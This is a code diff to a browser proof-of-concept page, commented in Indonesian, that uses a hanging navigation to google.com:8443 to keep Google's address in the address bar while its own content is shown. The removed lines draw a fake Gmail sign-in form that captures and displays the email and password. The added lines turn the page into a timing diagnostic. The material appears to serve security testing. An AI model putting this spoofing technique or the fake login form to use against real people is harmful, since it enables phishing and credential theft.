@@ -12,7 +12,7 @@
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; white-space: pre-wrap; text-align: left; max-height: 160px; overflow-y: auto; }
   iframe { display: none; }
 </style>
 </head>
@@ -33,73 +33,84 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
+  var t0 = performance.now();
+  var ticks = 0;
+  var active = false;
 
   function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[Delay Spoof] " + msg);
+    var elapsed = (performance.now() - t0).toFixed(1);
+    var line = `[+${elapsed}ms] ${msg}`;
+    statusEl.textContent = line;
+    console.log("[Delay Spoof] " + line);
+  }
+
+  document.addEventListener('visibilitychange', function () {
+    log("visibilitychange -> hidden=" + document.hidden + ", state=" + document.visibilityState);
+  });
+
+  window.addEventListener('pagehide', function (e) {
+    active = false;
+    log("pagehide -> persisted=" + e.persisted + ", ticks=" + ticks);
+  });
+
+  function raceTick(source) {
+    if (!active) return;
+    ticks++;
+    if (ticks % 100 === 0) {
+      log("race (" + source + ") -> ticks=" + ticks);
+    }
+  }
+
+  function raceLoop() {
+    if (!active) return;
+    raceTick("rAF");
+    queueMicrotask(function () {
+      if (active) raceTick("microtask");
+    });
+    requestAnimationFrame(raceLoop);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', function() {
+    active = true;
+    ticks = 0;
     log("[*] Memulai delay spoofing...");
+    requestAnimationFrame(raceLoop);
 
     // ============================================
     // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
     // ============================================
-    // Ini akan menggantung karena port 8443 tertutup.
-    // Address bar akan menampilkan google.com:8443 (delay ~30 detik).
     try {
       window.location.href = "https://www.google.com:8443";
     } catch (e) {
+      active = false;
       log("[-] Redirect error: " + e.message);
     }
 
     // ============================================
-    // 3. SELAMA DELAY, TAMPILKAN UI PALSU (SPOOFING)
+    // 3. SELAMA DELAY, TAMPILKAN STATUS DIAGNOSIS
     // ============================================
-    // Kita tidak bisa menyuntikkan konten ke halaman google.com:8443 (cross-origin).
-    // Tapi kita bisa memanfaatkan delay untuk menampilkan UI palsu di halaman kita
-    // SEBELUM redirect selesai.
-    
-    // Ubah tampilan halaman kita menjadi form login Google palsu
     setTimeout(function() {
+      if (!active) return;
       document.body.innerHTML = `
         <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
           <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-          <h2 style="color:#333;margin-bottom:10px;">Sign in</h2>
-          <p style="color:#666;font-size:14px;margin-bottom:20px;">to continue to Gmail</p>
-          <input type="email" id="spoofEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-          <input type="password" id="spoofPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Next</button>
-          <div style="margin-top:15px;font-size:11px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
+          <h2 style="color:#333;margin-bottom:10px;">Pending Navigation Probe</h2>
+          <p style="color:#666;font-size:14px;margin-bottom:20px;">Monitoring race state toward https://www.google.com:8443</p>
+          <div id="probeInfo" style="font-family:monospace;font-size:12px;color:#333;background:#f4f4f4;padding:12px;border-radius:6px;">Active race ticks: ${ticks}</div>
+          <div style="margin-top:15px;font-size:11px;color:#666;">Diagnostic test only.</div>
         </div>
       `;
 
-      // Tangkap input
-      document.getElementById('spoofLogin').addEventListener('click', function() {
-        var email = document.getElementById('spoofEmail').value;
-        var password = document.getElementById('spoofPass').value;
-        
-        // Tampilkan data yang ditangkap
-        document.body.innerHTML = `
-          <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
-            <h2 style="color:#f00;">Credentials Captured!</h2>
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Password:</strong> ${password}</p>
-            <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting to Google...</p>
-          </div>
-        `;
+      setTimeout(function() {
+        active = false;
+        window.location.href = 'https://www.google.com';
+      }, 2000);
 
-        // Redirect ke Google asli setelah 2 detik
-        setTimeout(function() {
-          window.location.href = 'https://www.google.com';
-        }, 2000);
-      });
-
-      log("[+] UI Spoofing ditampilkan. Menunggu input user...");
-    }, 1000); // Tampilkan UI palsu setelah 1 detik (saat redirect masih pending)
+      log("[+] Probe aktif selama pending navigation...");
+    }, 1000);
 
   }, { once: true });
 
